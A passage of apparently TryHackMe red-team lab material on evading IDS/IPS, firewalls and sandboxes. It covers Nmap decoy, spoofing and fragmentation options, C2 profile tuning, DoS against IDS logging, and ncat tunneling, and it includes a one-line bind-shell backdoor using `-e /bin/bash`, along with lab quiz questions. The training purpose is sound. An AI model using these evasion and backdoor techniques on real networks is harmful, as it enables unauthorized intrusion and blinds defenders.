- Strict routing can be specified using `S`. Strict routing requires you to set every hop between your system and the target host. For instance, `-ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3"` specifies that the packets go via these three hops before reaching the target host.

### Using Proxy Servers

The use of proxy servers can help hide your source. Nmap offers the option `--proxies` that takes a list of a comma-separated list of proxy URLs. Each URL should be expressed in the format `proto://host:port`. Valid protocols are HTTP and SOCKS4; moreover, authentication is not currently supported.

Consider the following example. Instead of running `nmap -sS MACHINE_IP`, you would edit your Nmap command to something like `nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 MACHINE_IP`. This way, you would make your scan go through HTTP
 proxy host1, then SOCKS4 proxy host2, before reaching your target. It 
is important to note that finding a reliable proxy requires some trial 
and error before you can rely on it to hide your Nmap scan source.

If you use your web browser to connect to the target, it would be a 
simple task to pass your traffic via a proxy server. Other network tools
 usually provide their own proxy settings that you can use to hide your 
traffic source.

**Evasion via Tactical DoS**

Evasion via tactical DoS includes:

- Launching denial of service against the IDS/IPS
- Launching denial of Service against the logging server

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/53b31ed73b300020fbf7b2b699769b95.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/53b31ed73b300020fbf7b2b699769b95.png)

An IDS/IPS
 requires a high processing power as the number of rules grows and the 
network traffic volume increases. Moreover, especially in the case of 
IDS, the primary response is logging traffic information matching the 
signature. Consequently, you might find it beneficial if you can:

- Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS.
- Create a massive amount of not-malicious traffic that would still
make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity.

It is also worth noting that the target of your attack can be the IDS operator. By causing a vast number of false positives, you can cause operator fatigue against your “adversary.”

**C2 and IDS/IPS Evasion**

Pentesting frameworks, such as Cobalt Strike and Empire, offer malleable Command and Control (C2)
 profiles. These profiles allow various fine-tuning to evade IDS/IPS 
systems. If you are using such a framework, it is worth creating a 
custom profile instead of relying on a default one. Examples variables 
you can control include the following:

- **User-Agent**: The tool or framework you are using can expose
you via its default-set user-agent. Hence, it is always important to set the user-agent to something innocuous and test to confirm your
settings.
- **Sleep Time**: The sleep time allows you to control the callback interval between beacon check-ins. In other words, you can control how
often the infected system will attempt to connect to the control system.
- **Jitter**: This variable lets you add some randomness to the
sleep time, specified by the jitter percentage. A jitter of 30% results
in a sleep time of ±30% to further evade detection.
- **SSL Certificate**: Using your authentic-looking SSL certificate will significantly improve your chances of evading detection. It is a
very worthy investment of time.
- **DNS Beacon**: Consider the case where you are using DNS protocol to exfiltrate data. You can fine-tune DNS beacons by setting
the DNS servers and the hostname in the DNS query. The hostname will be
holding the exfiltrated data.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/76553d2628f4e64bea1fc6fb5b4ff5b9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/76553d2628f4e64bea1fc6fb5b4ff5b9.png)

This [CobaltStrike Guideline Profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile) shows how a profile is put together.

**Next-Gen Security**

Next-Generation Network IPS (NGNIPS) has the following five characteristics according to [Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market):

1. Standard first-generation IPS capabilities: A next-generation network IPS should achieve what a traditional network IPS can do.
2. Application awareness and full-stack visibility: Identify traffic
from various applications and enforce the network security policy. An
NGNIPS must be able to understand up to the application layer.
3. Context-awareness: Use information from sources outside of the IPS to aid in blocking decisions.
4. Content awareness: Able to inspect and classify files, such as
executable programs and documents, in inbound and outbound traffic.
5. Agile engine: Support upgrade paths to benefit from new information feeds.

Because a Next-Generation Firewall
 (NGFW) provides the same functionality as an IPS, it seems that the 
term NGNIPS is losing popularity for the sake of NGFW. You can read more
 about NGFW in the [Red Team Firewalls](https://tryhackme.com/room/redteamfirewalls) room.

## **FIREWALLS**

**Types of Firewalls**

There are multiple ways to classify firewalls. One way to classify firewalls would be whether they are independent appliances.

1. Hardware Firewall (appliance firewall): As the name implies, an appliance firewall is a
separate piece of hardware that the network traffic has to go through.
Examples include Cisco ASA (Adaptive Security Appliance), WatchGuard
Firebox, and Netgate pfSense Plus appliance.
2. Software firewall: This is a piece of software that comes bundled with the OS, or you can install it as an additional service. MS Windows has a
built-in firewall, Windows Defender Firewall, that runs along with the
other OS services and user applications. Another example is Linux
iptables and firewalld.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b496d0fb1bec2be05d7202e2ddbf1663.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b496d0fb1bec2be05d7202e2ddbf1663.png)

We can also classify firewalls into:

1. Personal firewall: A personal firewall is designed to protect a
single system or a small network, for example, a small number of devices and systems at a home network. Most likely, you are using a personal
firewall at home without paying much attention to it. For instance, many wireless access points designed for homes have a built-in firewall. One example is Bitdefender BOX. Another example is the firewall that comes
as part of many wireless access points and home routers from Linksys and Dlink.
2. Commercial firewall: A commercial firewall protects medium-to-large
networks. Consequently, you would expect higher reliability and
processing power, in addition to supporting a higher network bandwidth.
Most likely, you are going through such a firewall when accessing the
Internet from within your university or company.

From the red team perspective, the most crucial classification would 
be based on the firewall inspection abilities. It is worth thinking 
about the firewall abilities in terms of the ISO/OSI layers shown in the
 figure below. Before we classify firewalls based on their abilities, it
 is worthy of remembering that firewalls focus on layers 3 and 4 and, to
 a lesser extent, layer 2. Next-generation firewalls are also designed 
to cover layers 5, 6, and 7. The more layers a firewall can inspect, the
 more sophisticated it gets and the more processing power it needs.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ad200ff1a857631d88940d3e3637736b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ad200ff1a857631d88940d3e3637736b.png)

Based on firewall abilities, we can list the following firewall types:

- Packet-Filtering Firewall: Packet-filtering is the most basic type of firewall. This type of
firewall inspects the protocol, source and destination IP addresses, and source and destination ports in the case of TCP and UDP datagrams. It
is a stateless inspection firewall.
- Circuit-Level Gateway: In addition to the features offered by
the packet-filtering firewalls, circuit-level gateways can provide
additional capabilities, such as checking TCP three-way-handshake against the firewall rules.
- Stateful Inspection Firewall: Compared to the previous types, this type of firewall gives an
additional layer of protection as it keeps track of the established TCP
sessions. As a result, it can detect and block any TCP packet outside an established TCP session.
- Proxy Firewall: A proxy firewall is also referred to as Application Firewall
(AF) and Web Application Firewall (WAF). It is designed to masquerade as the original client and requests on its behalf. This process allows the proxy firewall to inspect the contents of the packet payload instead of being limited to the packet headers. Generally speaking, this is used
for web applications and does not work for all protocols.
- Next-Generation Firewall (NGFW): NGFW offers the highest firewall protection. It can practically monitor all network layers, from OSI Layer 2 to OSI Layer 7. It has
application awareness and control. Examples include the Juniper SRX
series and Cisco Firepower.
- Cloud Firewall or Firewall as a Service (FWaaS): FWaaS replaces a hardware firewall in a cloud environment. Its features might be comparable to NGFW,
depending on the service provider; however, it benefits from the
scalability of cloud architecture. One example is Cloudflare Magic
Firewall, which is a network-level firewall. Another example is Juniper
vSRX; it has the same features as an NGFW but is deployed in the
cloud. It is also worth mentioning AWS WAF for web application
protection and AWS Shield for DDoS protection.

**Evasion via Controlling the Source MAC/IP/Port**

When scanning a 
host behind a firewall, the firewall will usually detect and block port 
scans. This situation would require you to adapt your network and port 
scan to evade the firewall. A network scanner like Nmap provides few features to help with such a task. In this room, we group Nmap techniques into three groups:

1. Evasion via controlling the source MAC/IP/Port
2. Evasion via fragmentation, MTU, and data length
3. Evasion through modifying header fields

Nmap allows you to hide or spoof the source as you can use:

1. Decoy(s)
2. Proxy
3. Spoofed MAC Address
4. Spoofed Source IP Address
5. Fixed Source Port Number

Before we elaborate on each approach, let’s show what a Nmap stealth (SYN) scan looks like. We are scanning an MS Windows target (with default built-in firewall), so we added `-Pn` to force the scan to proceed even if no ping reply is received. `-Pn`
 is used to skip host discovery and testing whether the host is live. 
Moreover, to speed up the scan, we limited ourselves to the 100 most 
common ports using the `-F` option. The scan was performed using the following command `nmap -sS -Pn -F MACHINE_IP`.

The following screenshot shows Wireshark’s capture of the Nmap probe packets. Wireshark was running on the same system running Nmap.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/169fd944d79366e156fcb6c30ff8018e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/169fd944d79366e156fcb6c30ff8018e.png)

We can dive into all the details embedded into each packet; however, for this exercise, we would like to note the following:

- Our IP address `10.14.17.226` has generated and sent around 200 packets. The `F` option limits the scan to the top 100 common ports; moreover, each port is sent a second SYN packet if it does not reply to the first one.
- The source port number is chosen at random. In the screenshot, you can see it is 37710.
- The total length of the IP packet is 44 bytes. There are 20 bytes for the IP header, which leaves 24 bytes for the TCP header. No data is sent via TCP.
- The Time to Live (TTL) is 42.
- No errors are introduced in the checksum.

In the following sections and tasks, we will see how Nmap provides various options to evade the firewall and other network security solutions.

Answer the questions below

What is the size of the IP packet when using a default Nmap stealth (SYN) scan?

How many bytes does the TCP segment hold in its data field when using a default Nmap stealth (SYN) scan?

Approximately, how many packets do you expect Nmap to send when running the command `nmap -sS -F MACHINE_IP`? Approximate to the nearest 100, such as 100, 200, 300, etc.

### Decoy(s)

Hide your scan with decoys. Using decoys makes your IP address mix 
with other “decoy” IP addresses. Consequently, it will be difficult for 
the firewall and target host to know where the port scan is coming from.
 Moreover, this can exhaust the blue team investigating each source IP 
address.

Using the `-D` option, you can add decoy source IP addresses to confuse the target. Consider the following command, `nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F MACHINE_IP`. The Wireshark capture is shown in the following figure.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0123f32d7cc90fca50a3d565824955b1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0123f32d7cc90fca50a3d565824955b1.png)

The target `MACHINE_IP` will also see scans coming from `10.10.10.1` and `10.10.10.2` when only one source IP address, `ME`, is running the scan. Note that if you omit the `ME` entry in the scan command, Nmap will put your real IP address, i.e. `ME`, in a random position.

You can also set Nmap to use random source IP addresses instead of explicitly specifying them. By running `nmap -sS -Pn -D RND,RND,ME -F MACHINE_IP`, Nmap
 will choose two random source IP addresses to use as decoys. Nmap will 
use new random IP addresses each time you run this command. In the 
screenshot below, we see how Nmap picked two random IP addresses in 
addition to our own, `10.14.17.226`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2fb8362a71b22cdbe9e60fd638c1813c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2fb8362a71b22cdbe9e60fd638c1813c.png)

Approximately, how many packets do you expect Nmap to send when running the command `nmap -sS -Pn -D RND,10.10.55.33,ME,RND -F MACHINE_IP`? Approximate to the nearest 100, such as 100, 200, 300, etc.

### Proxy

Use an HTTP/SOCKS4 proxy. Relaying the port scan via a proxy 
helps keep your IP address unknown to the target host. This technique 
allows you to keep your IP address hidden while the target logs the IP 
address of the proxy server. You can go this route using the Nmap option `--proxies PROXY_URL`. For example, `nmap -sS -Pn --proxies PROXY_URL -F MACHINE_IP` will send all its packets via the proxy server you specify. Note that you can chain proxies using a comma-separated list.

What do you expect the target to see as the source of the scan when you run the command `nmap -sS -Pn --proxies 10.10.13.37 MACHINE_IP`

### Spoofed MAC Address

Spoof the source MAC address. Nmap allows you to spoof your MAC address using the option `--spoof-mac MAC_ADDRESS`.
 This technique is tricky; spoofing the MAC address works only if your 
system is on the same network segment as the target host. The target 
system is going to reply to a spoofed MAC address. If you are not on the
 same network segment, sharing the same Ethernet, you won’t be able to 
capture and read the responses. It allows you to exploit any trust 
relationship based on MAC addresses. Moreover, you can use this 
technique to hide your scanning activities on the network. For example, 
you can make your scans appear as if coming from a network printer.

What company has registered the following Organizationally Unique Identifier (OUI), i.e., the first 24 bits of a MAC address, `00:02:DC`?

### Spoofed IP Address

Spoof the source IP address. Nmap lets you spoof your IP address using `-S IP_ADDRESS`.
 Spoofing the IP address is useful if your system is on the same 
subnetwork as the target host; otherwise, you won’t be able to read the 
replies sent back. The reason is that the target host will reply to the 
spoofed IP address, and unless you can capture the responses, you won’t 
benefit from this technique. Another use for spoofing your IP address is
 when you control the system that has that particular IP address. 
Consequently, if you notice that the target started to block the spoofed
 IP address, you can switch to a different spoofed IP address that 
belongs to a system that you also control. This scanning technique can 
help you maintain stealthy existence; moreover, you can use this 
technique to exploit trust relationships on the network based on IP 
addresses.

To mislead the opponent, you decided to make your port scans appear 
as if coming from a local access point that has the IP address `10.10.0.254`. What option needs to be added to your Nmap command to spoof your address accordingly?

### Fixed Source Port Number

Use a specific source port number. Scanning from one particular
 source port number can be helpful if you discover that the firewalls 
allow incoming packets from particular source port numbers, such as port
 53 or 80. Without inspecting the packet contents, packets from source TCP
 port 80 or 443 look like packets from a web server, while packets from 
UDP port 53 look like responses to DNS queries. You can set your port 
number using `-g` or `--source-port` options.

The following Wireshark screenshot shows a Nmap scan with the fixed source TCP port number 8080. We have used the following Nmap command, `nmap -sS -Pn -g 8080 -F MACHINE_IP`. You can see in the screenshot how it is that all the TCP connections are sent from the same TCP port number.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a0307f9e74e7f110b546dc7b423a288e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a0307f9e74e7f110b546dc7b423a288e.png)

You decide to use Nmap to scan for open UDP ports. You notice that using `nmap -sU -F MACHINE_IP` to discover the open common UDP ports won’t give you any meaningful results. What do you need to add to your Nmap command to set the source port number to 53?

This is a quick summary of the Nmap options discussed in this task.

| Evasion Approach | Nmap Argument |
| --- | --- |
| Hide a scan with decoys | `-D DECOY1_IP1,DECOY_IP2,ME` |
| Hide a scan with random decoys | `-D RND,RND,ME` |
| Use an HTTP/SOCKS4 proxy to relay connections | `--proxies PROXY_URL` |
| Spoof source MAC address | `--spoof-mac MAC_ADDRESS` |
| Spoof source IP address | `-S IP_ADDRESS` |
| Use a specific source port number | `-g PORT_NUM` or `--source-port PORT_NUM` |

**Evasion via Forcing Fragmentation, MTU, and Data Length**

You can control the packet size as it allows you to:

- Fragment packets, optionally with given MTU. If the firewall, or the IDS/IPS, does not reassemble the packet, it
will most likely let it pass. Consequently, the target system will
reassemble and process it.
- Send packets with specific data lengths.

Answer the questions below

### Fragment Your Packets with 8 Bytes of Data

One easy way to fragment your packets would be to use the `-f` option. This option will fragment the IP packet to carry only 8 bytes of data. As mentioned earlier, running a Nmap
 TCP port scan means that the IP packet will hold 24 bytes, the TCP 
header. If you want to limit the IP data to 8 bytes, the 24 bytes of the
 TCP header will be divided across 3 IP packets. And this is precisely 
what we obtained when we ran this Nmap scan, `nmap -sS -Pn -f -F MACHINE_IP`.
 As we can see in the Wireshark capture in the figure below, each IP 
packet is fragmented into three packets, each with 8 bytes of data.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/4b9961c8f49af3eded45b0b43c03548b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/4b9961c8f49af3eded45b0b43c03548b.png)

What is the size of the IP packet when running Nmap with the `-f` option?

### Fragment Your Packets with 16 Bytes of Data

Another handy option is the `-ff`, limiting the IP data to 16 bytes. (One easy way to remember this is that one `f` is 8 bytes, but two `f`s are 16 bytes.) By running `nmap -sS -Pn -ff -F MACHINE_IP`, we expect the 24 bytes of the TCP header to be divided between two IP packets, 16 + 8, because `-ff` has put an upper limit of 16 bytes. The first few packets are shown in the Wireshark capture below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/fc0fd2f0fed576aed08e9750acff314b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/fc0fd2f0fed576aed08e9750acff314b.png)

What is the maximum size of the IP packet when running Nmap with the `-ff` option?

### Fragment Your Packets According to a Set MTU

Another neat way to fragment your packets is by setting the MTU. In Nmap, `--mtu VALUE` specifies the number of bytes per IP packet. In other words, the IP header size is not included. The value set for MTU must always be a multiple of 8.

*Note that the Maximum Transmission Unit (MTU)
 indicates the maximum packet size that can pass on a certain link-layer
 connection. For instance, Ethernet has an MTU of 1500, meaning that the
 largest IP packet that can be sent over an Ethernet (link layer) 
connection is 1500 bytes. Please don’t confuse this MTU with the `--mtu` in Nmap options.*

Running Nmap with `--mtu 8` will be identical to `-f` as the IP data will be limited to 8 bytes. The first few packets generated by this Nmap scan `nmap -sS -Pn --mtu 8 -F MACHINE_IP` are shown in the following Wireshark capture.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/7ec48d889b3ba89910d69526ddbe4fd2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/7ec48d889b3ba89910d69526ddbe4fd2.png)

What is the maximum size of the IP packet when running Nmap with `--mtu 36` option?

### Generate Packets with Specific Length

In some instances, you might find out that the size of the packets is
 triggering the firewall or the IDS/IPS to detect and block you. If you 
ever find yourself in such a situation, you can make your port scanning 
more evasive by setting a specific length. You can set the length of 
data carried within the IP packet using `--data-length VALUE`. Again, remember that the length should be a multiple of 8.

If you run the following Nmap scan `nmap -sS -Pn --data-length 64 -F MACHINE_IP`, each TCP
 segment will be padded with random data till its length is 64 bytes. In
 the screenshot below, we can see that each TCP segment has a length of 
64 bytes.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c71dd8a63e95fac1ad5a2aa68220c780.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c71dd8a63e95fac1ad5a2aa68220c780.png)

What is the maximum size of the IP packet when running Nmap with `--data-length 128` option?

This is a quick summary of the Nmap options discussed in this task.

| Evasion Approach | Nmap Argument |
| --- | --- |
| Fragment IP data into 8 bytes | `-f` |
| Fragment IP data into 16 bytes | `-ff` |
| Fragment packets with given MTU | `--mtu VALUE` |
| Specify packet length | `--data-length NUM` |

**Evasion via Modifying Header Fields**

Nmap allows you to control various header fields that might help evade the firewall. You can:

- Set IP time-to-live
- Send packets with specified IP options
- Send packets with a wrong TCP/UDP checksum

### Set TTL

Nmap
 gives you further control over the different fields in the IP header. 
One of the fields you can control is the Time-to-Live (TTL). Nmap 
options include `--ttl VALUE` to set the TTL to a custom value. This option might be useful if you think the default TTL exposes your port scan activities.

In the following screenshot, we can see the packets captured by Wireshark after using a custom TTL as we run our scan, `nmap -sS -Pn --ttl 81 -F MACHINE_IP`. As with the previous examples, the packets below are captured on the same system running Nmap.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f98efaf6faf449bf6cc2787baa581e31.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f98efaf6faf449bf6cc2787baa581e31.png)

Answer the questions below

Start the AttackBox and the machine 
attached to this task. After you give them time to load fully, scan the 
attached MS Windows machine using `--ttl 1` option. 
Check the number of ports that appear to be open. The answer will vary 
depending on whether you are using the AttackBox or connecting over VPN. We suggest you try both.

Scan the attached MS Windows machine using `--ttl 2` option. How many ports appear to be open?

### Set IP Options

One of the IP header fields is the IP Options field. Nmap lets you control the value set in the IP Options field using `--ip-options HEX_STRING`, where the hex string can specify the bytes you want to use to fill in the IP Options field. Each byte is written as `\xHH`, where `HH` represents two hexadecimal digits, i.e., one byte.

A shortcut provided by Nmap is using the letters to make your requests:

- `R` to record-route.
- `T` to record-timestamp.
- `U` to record-route and record-timestamp.
- `L` for loose source routing and needs to be followed by a list of IP addresses separated by space.
- `S` for strict source routing and needs to be followed by a list of IP addresses separated by space.

The loose and strict source routing can be helpful if you want to try
 to make your packets take a particular route to avoid a specific 
security system.

### Use a Wrong Checksum

Another trick you can use is to send your packets with an 
intentionally wrong checksum. Some systems would drop a packet with a 
bad checksum, while others won’t. You can use this to your advantage to 
discover more about the systems in your network. All you need to do is 
add the option `--badsum` to your Nmap command.

Using `nmap -sS -Pn --badsum -F MACHINE_IP`, we scanned our target using intentionally incorrect TCP checksums. The target dropped all our packets and didn’t respond to any of them.

Pentester Terminal

```
pentester@TryHackMe# nmap -sS -Pn --badsum -F MACHINE_IPHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-28 16:07 EET
Nmap scan report for MACHINE_IP
Host is up.
All 100 scanned ports on MACHINE_IP are filtered

Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
```

The screenshot below shows the packets captured by Wireshark on the system running Nmap. Wireshark can be optionally set to verify the checksums, and we can notice how it highlights the errors.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c7817144af9ef754d778fc4efb0f9a36.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c7817144af9ef754d778fc4efb0f9a36.png)

Scan the attached MS Windows machine using the `--badsum` option. How many ports appear to be open?

This is a quick summary of the Nmap options discussed in this task.

| Evasion Approach | Nmap Argument |
| --- | --- |
| Set IP time-to-live field | `--ttl VALUE` |
| Send packets with specified IP options | `--ip-options OPTIONS` |
| Send packets with a wrong TCP/UDP checksum | `--badsum` |

**Evasion Using Port Hopping**

Three common firewall evasion techniques are:

- Port hopping
- Port tunneling
- Use of non-standard ports

Port hopping is a technique where an application hops from one port 
to another till it can establish and maintain a connection. In other 
words, the application might try different ports till it can 
successfully establish a connection. Some “legitimate” applications use 
this technique to evade firewalls. In the following figure, the client 
kept trying different ports to reach the server till it discovered a 
destination port not blocked by the firewall.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/26fce8aa8569f391ad64a26a147de2d4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/26fce8aa8569f391ad64a26a147de2d4.png)

There is another type of port hopping where the application 
establishes the connection on one port and starts transmitting some 
data; after a while, it establishes a new connection on (i.e., hopping 
to) a different port and resumes sending more data. The purpose is to 
make it more difficult for the blue team to detect and track all the 
exchanged traffic.

On the AttackBox, you can use the command `ncat -lvnp PORT_NUMBER` to listen on a certain TCP port.

- `l` listens for incoming connections
- `v` provides verbose details (optional)
- `n` does not resolve hostnames via DNS (optional)
- `p` specifies the port number to use
- `lvnp PORT_NUMBER` listens on TCP port `PORT_NUMBER`. If the port number is less than 1024, you need to run `ncat` as root.

For example, run `ncat -lvnp 1025` on the AttackBox to listen on TCP port 1025, as shown in the terminal output below.

Pentester Terminal

```
pentester@TryHackMe$ ncat -lvnp 1025Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1025
Ncat: Listening on 0.0.0.0:1025
```

We want to test if the target machine can connect to the AttackBox on TCP port 1025. By browsing to `http://MACHINE_IP:8080`, you will be faced with a web page that lets you execute commands on the target machine. *Note that in a real-case scenario, you might be exploiting a vulnerable service that allows remote code execution (RCE) or a misconfigured system to execute some code of your choice.*

In this lab, you can simply run a Linux command by submitting it on the provided form at `http://MACHINE_IP:8080`. We can use Netcat to connect to the target port using the command `ncat IP_ADDRSS PORT_NUMBER`. For instance, we can run `ncat ATTACKBOX_IP 1024` to connect to the AttackBox at TCP
 port 1024. We want to check if the firewall is configured to allow 
connections. If the connection from the machine, with IP address `MACHINE_IP`, can pass through the firewall, we will be notified of the successful connection on the AttackBox terminal as shown below.

Pentester Terminal

```
pentester@TryHackMe$ ncat -lvnp 1025Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1025
Ncat: Listening on 0.0.0.0:1025
Ncat: Connection from 10.10.30.130.
Ncat: Connection from 10.10.30.130:51292.
```

**Evasion Using Port Tunneling**

Port tunneling is also known as *port forwarding* and *port mapping*.
 In simple terms, this technique forwards the packets sent to one 
destination port to another destination port. For instance, packets sent
 to port 80 on one system are forwarded to port 8080 on another system.

### Port Tunneling Using `ncat`

Consider the case where you have a server behind the firewall that 
you cannot access from the outside. However, you discovered that the 
firewall does not block specific port(s). You can use this knowledge to 
your advantage by tunneling the traffic via a different port.

Consider the following case. We have an SMTP
 server listening on port 25; however, we cannot connect to the SMTP 
server because the firewall blocks packets from the Internet sent to 
destination port 25. We discover that packets sent to destination port 
443 are not blocked, so we decide to take advantage of this and send our
 packets to port 443, and after they pass through the firewall, we 
forward them to port 25. Let’s say that we can run a command of our 
choice on one of the systems behind the firewall. We can use that system
 to forward our packets to the SMTP server using the following command.

`ncat -lvnp 443 -c "ncat TARGET_SERVER 25"`

The command `ncat` uses the following options:

- `lvnp 443` listens on TCP port 443. Because the port number is less than 1024, you need to run `ncat` as root in this case.
- `c` or `-sh-exec` executes the given command via `/bin/sh`.
- `"ncat TARGET_SERVER 25"` will connect to the target server at port 25.

As a result, `ncat` will listen on port 443, but it will 
forward all packets to port 25 on the target server. Because in this 
case, the firewall is blocking port 25 and allowing port 443, port 
tunneling is an efficient way to evade the firewall.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ef6b903dbb6c4eb20051f9ddd5b9fa8f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ef6b903dbb6c4eb20051f9ddd5b9fa8f.png)

**Evasion Using Non-Standard Ports**

`ncat -lvnp PORT_NUMBER -e /bin/bash` will create a backdoor via the specified port number that lets you interact with the Bash shell.

- `e` or `-exec` executes the given command
- `/bin/bash` location of the command we want to execute

On the AttackBox, we can run `ncat MACHINE_IP PORT_NUMBER` to connect to the target machine and interact with its shell.

Considering the case that we have a firewall, it is not enough to use `ncat` to create a backdoor unless we can connect to the listening port number. Moreover, unless we run `ncat` as a privileged user, `root`, or using `sudo`, we cannot use port numbers below 1024.

**Next-Generation Firewalls**

Traditional firewalls, 
such as packet-filtering firewalls, expect a port number to dictate the 
protocol being used and identify the application. Consequently, if you 
want to block an application, you need to block a port. Unfortunately, 
this is no longer valid as many applications camouflage themselves using
 ports assigned for other applications. In other words, a port number is
 no longer enough nor reliable to identify the application being used. 
Add to this the pervasive use of encryption, for example, via SSL/TLS.

Next-Generation Firewall (NGFW) is designed to handle the new challenges facing modern enterprises. For instance, some of NGFW capabilities include:

- Integrate a firewall and a real-time Intrusion Prevention System (IPS). It can stop any detected threat in real-time.
- Identify users and their traffic. It can enforce the security policy per-user or per-group basis.
- Identify the applications and protocols regardless of the port number being used.
- Identify the content being transmitted. It can enforce the security policy in case any violating content is detected.
- Ability to decrypt SSL/TLS and SSH traffic. For instance, it restricts evasive techniques built around encryption to transfer malicious files.

A properly configured and deployed NGFW renders many attacks useless.

## **SANDBOX EVASIONS**

**An Adversary walks into a Sandbox**

# What is Malware Analysis

Malware Analysis is the process of analyzing a suspicious file to 
determine what it does on both a micro level (by looking at Assembly), 
and a macro level (by looking at what it does on the system). This 
process lets Blue Teamers gain a better understanding of malicious 
programs, which can aid them in developing detections.

# Static vs.

There are two ways that a Blue Teamer can analyze a suspicious 
file; one way is by looking at the code on a micro-level (as previously 
stated) by using Disassemblers such as IDA or Ghidra. This process is more well known as “Static Analysis”.

On the flip side of the coin, we can observe what happens when 
the suspicious file is executed on the system through a process called 
“Dynamic Analysis”. On the system, there are often many analysis tools 
installed, such as EDR Software, Sysmon, ProcMon, Process Hacker, and Debuggers (For example, OllyDebug, WinDbg, x64Dbg), and much more.

# Introduction to Sandboxes

One
 of the most creative and effective ways that Blue Teamers have come up 
with to analyze suspicious-looking files is in the category of Dynamic Analysis.
 This method involves running the file in a containerized (or 
virtualized) environment; This environment is referred to as a Sandbox. 
Depending on the sandbox of choice, you may be able to customize what 
version of Windows is running, the software installed on the machine, 
and much more.

Sandboxes provide a safe and effective way to monitor what a 
suspicious-looking file does before running it on a production system 
(or allowing it to be sent to a production system). There are many 
commercial Sandboxes that may be in place in various parts of a network.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/a2e2d18182fe38e0f8709aafae9c33bc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/a2e2d18182fe38e0f8709aafae9c33bc.png)

In
 the diagram above, there are three different sandboxes in place. It is 
not uncommon for there to be one, two, or even three Sandboxes in a 
corporate environment. Often you may find them in the following places:

- Firewalls
- Mail Servers
- Workstations

Each sandbox may work differently; for example, a Firewall
 may execute the attachment in the email and see what kind of network 
communications occur, whereas a Mail sandbox may open the email and see 
if an embedded file within the email triggers a download over a protocol
 like SMB in an attempt to steal a NetNTLM hash, where a host-based 
Anti-Virus Sandbox may execute the file and monitor for malicious 
programmatic behavior or changes to the system.

There are various vendors that make various Sandbox products that 
Blue Teamers may be able to deploy in a corporate network. Here are some
 popular examples:

- Palo Alto Wildfire ([Firewall](https://www.paloaltonetworks.co.uk/products/secure-the-network/wildfire))
- Proofpoint TAP ([Email Sandbox](https://www.proofpoint.com/uk/products/advanced-threat-protection/targeted-attack-protection))
- Falcon Sandbox ([EDR/Workstation](https://www.crowdstrike.co.uk/products/threat-intelligence/falcon-sandbox-malware-analysis/))
- MimeCast ([Email Sandbox](https://www.mimecast.com/))
